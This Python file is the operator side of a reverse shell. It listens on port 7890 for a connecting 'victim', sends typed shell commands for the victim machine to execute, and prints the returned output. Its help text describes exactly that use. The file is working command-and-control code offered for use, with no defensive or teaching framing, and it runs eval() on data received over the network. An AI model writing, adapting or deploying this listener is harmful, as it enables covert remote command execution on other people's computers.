import socket
import sys

# Port listening for the victim's connection
port = 7890

# Style out prompt and output
output_style = "full"


# Format client payload to string output
def format_output(payload):
    payload = payload.decode('utf-8')
    payload = eval(payload)
    stdout, stderr = payload[0], payload[1]
    if len(stdout) == 0 and len(stderr) == 0:
        return ""
    result = ""
    if output_style == "full":
        result += 'Received'.center(40, "=") + '\n'
        if len(stdout) != 0:
            result += ("Command stdout".center(20, "=")) + '\n'
            result += str(stdout) + '\n'
        if len(stderr) != 0:
            result += ("Command stderr".center(20, "=")) + '\n'
            result += str(stderr) + '\n'
    else:
        result += stdout + '\n' + stderr
    return result


# Custom command behaviour
# Todo: generate command to enable ssh server for windows 10 and linux
def parse_custom_command(cmd: str) -> str:
    global output_style
    if cmd == "help":
        show_help()
    elif cmd == "exit":
        print("Exiting")
        exit(0)
    elif cmd == "simple":
        output_style = "simple"
    elif cmd == "full":
        output_style = "full"
    return ""


# Create the server socket that await the victim to connect to
def create_socket():
    global output_style

    # Create a TCP/IP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Bind the socket to accept any ip at port
    server_address = ('0.0.0.0', port)
    sock.bind(server_address)

    print("Waiting for connection ...")
    sock.listen()

    # Accept an incoming connection
    connection, client_address = sock.accept()
    print('Connected by', client_address)

    # Receive data from the client
    while True:
        prompt = "Send command (type \"-> help\" to help): " if output_style == "full" else ">"
        command = input(prompt)
        # Parse custom commands
        if command.split(" ")[0] == "->":
            custom_command = command.split(" ")[1]
            command = parse_custom_command(custom_command)

        # Skip empty command
        if len(command) == 0:
            continue

        command = bytes(command, encoding='utf-8')
        connection.sendall(command)

        payload = connection.recv(1024)
        print(format_output(payload))


def show_help():
    content = '''
Help menu
This is the server script that awaits a victim to connect to
Once connected, you can send shell command for the victim to execute

=========== Custom commands ==========
+-------------+----------------------+
| -> help     | - to see this page   |
| -> exit     | - to exit shell      |
| -> simple   | - to simplify output |
| -> full     | - to use full output |
+-------------+----------------------+
'''
    print(content)


def main():
    if len(sys.argv) > 1:
        show_help()
        exit(0)
    create_socket()


if __name__ == '__main__':
    main()
